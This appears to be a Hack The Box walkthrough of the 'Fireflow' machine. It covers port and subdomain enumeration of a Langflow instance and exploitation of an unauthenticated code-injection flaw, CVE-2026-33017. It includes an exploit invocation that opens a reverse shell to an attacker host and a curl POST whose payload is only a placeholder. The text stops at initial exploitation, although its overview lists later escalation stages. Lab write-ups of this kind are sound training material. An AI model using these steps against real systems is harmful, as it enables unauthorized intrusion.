Fireflow — Hack The Box Walkthrough
Overview

This walkthrough documents the complete attack path against the Fireflow machine.

The compromise follows several stages:
    Network and service enumeration
    Virtual host / subdomain discovery
    Identification of a vulnerable Langflow instance
    Unauthenticated Remote Code Execution through CVE-2026-33017
    Initial shell as www-data
    Credential discovery through environment variables
    SSH access as nightfall
    Discovery of an internal MCP server
    SSH local port forwarding to access the internal service
    Authentication to the MCP API
    JWT authentication misconfiguration and privilege escalation to admin
    Registration and execution of a malicious MCP tool
    Shell as the mcp user
    Kubernetes privilege escalation through nodes/proxy
    Access to the host filesystem and retrieval of the root flag

1. Enumeration

The first step is to identify the exposed services and obtain as much information as possible about the target.

nmap -T5 -sV -sC -Pn 10.129.60.35 -v

Nmap options

    -T5 — aggressive timing template.

    -sV — attempts to identify service versions.

    -sC — runs the default Nmap scripts.

    -Pn — skips host discovery and assumes the host is online.

    -v — verbose output.

The interesting results are:

PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
443/tcp   open     ssl/http  nginx
9100/tcp  filtered jetdirect
30000/tcp filtered ndmps
30718/tcp filtered unknown
30951/tcp filtered unknown
31038/tcp filtered unknown
31337/tcp filtered Elite

The most interesting exposed services are therefore:

    22/tcp — SSH

    443/tcp — HTTPS / NGINX

The HTTPS service redirects to:

https://fireflow.htb/

The TLS certificate is particularly useful because it reveals the hostname:

Subject: commonName=fireflow.htb
Subject Alternative Name:
    DNS:fireflow.htb
    DNS:*.fireflow.htb

The wildcard SAN is a good indication that subdomains may be in use.
2. Add the Hostnames to /etc/hosts

Before interacting with the web application, resolve the discovered hostname locally.

echo "10.129.60.35 fireflow.htb" | sudo tee -a /etc/hosts
echo "10.129.60.35 flow.fireflow.htb" | sudo tee -a /etc/hosts

This allows the browser and command-line tools to resolve both:

fireflow.htb
flow.fireflow.htb

to the target IP.
3. Web Enumeration
3.1 Nikto

First, perform a basic web-server scan:

nikto -h https://fireflow.htb/

Nothing particularly interesting was identified at this stage.
3.2 Directory Enumeration

Next, enumerate common directories on the HTTPS virtual host.

gobuster dir -u https://fireflow.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k

No interesting result was returned with this wordlist.

Because the certificate contains:

DNS:*.fireflow.htb

the next logical step is to investigate virtual hosts and subdomains.
4. Virtual Host Enumeration

We can use Gobuster's vhost mode to test potential virtual hosts.

gobuster vhost -u https://fireflow.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k -c 200,301,302,403

The server generated many responses that could result in false positives. To filter responses with an unexpected content length:

gobuster vhost -u https://fireflow.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k -c 200,301,302,403 --exclude-length 150

We can also perform DNS subdomain enumeration.

The wordlist used here is:

/usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt

Command:

gobuster dns -d fireflow.htb -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt --wildcard

Another variation was tested by explicitly specifying the DNS server:

gobuster dns -d fireflow.htb -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt -r 10.129.60.35

This eventually led to the interesting virtual host:

flow.fireflow.htb

5. Discovering the Langflow Application

Browsing the discovered subdomain revealed an interesting public playground URL:

https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25

This exposed a Langflow flow.

The flow ID is particularly important because it can be referenced through the API.

The corresponding API endpoint is:

https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636/

At this point, the attack surface changed significantly.

Instead of attacking the NGINX server directly, the goal became to understand the exposed Langflow API.
6. Langflow Enumeration

Additional directory enumeration was performed against the Langflow instance:

gobuster dir -u https://flow.fireflow.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -k -c 200,301,302,403 --exclude-length 150,1142

Interesting endpoints were discovered:

https://flow.fireflow.htb/login
https://flow.fireflow.htb/docs

The /docs endpoint is especially useful because Langflow exposes API documentation there.

The API version can also be queried directly:

https://flow.fireflow.htb/api/v1/version

The version returned was:

1.8.2

7. Identifying the Vulnerability

The Langflow version and exposed API endpoint led to the discovery of:

CVE-2026-33017

The vulnerability is an unauthenticated Remote Code Execution affecting the public flow-building endpoint:

/api/v1/build_public_tmp/{flow_id}/flow

The important security issue is that attacker-controlled flow definitions can contain Python code which is ultimately executed by the application.

In other words, the public flow functionality provides a path from:

Unauthenticated HTTP request
        ↓
Attacker-controlled flow
        ↓
Python code execution
        ↓
Remote Code Execution

A public technical reference for the Langflow code-injection issue was also identified:

https://www.sonicwall.com/blog/langflow-ai-code-injection-to-rce-flaw

8. Exploiting Langflow for Initial RCE

A Python exploit was available to automate exploitation:

python exploit.py --url https://flow.fireflow.htb/api/v1/build_public_tmp/ --flow-id 7d84d636-af65-42e4-ac38-26e867052c25 --lhost 10.0.3.1 --lport 4443 --listen

An alternative approach is to send the malicious flow directly to the API.

curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4ac38-26e867052c25/flow' \
-H 'Content-Type: application/json' \
-b 'client_id=attacker' \
-d '{
        Remeote shell in the payload
    }'

The JSON payload was easier to manage by placing it in a separate file.
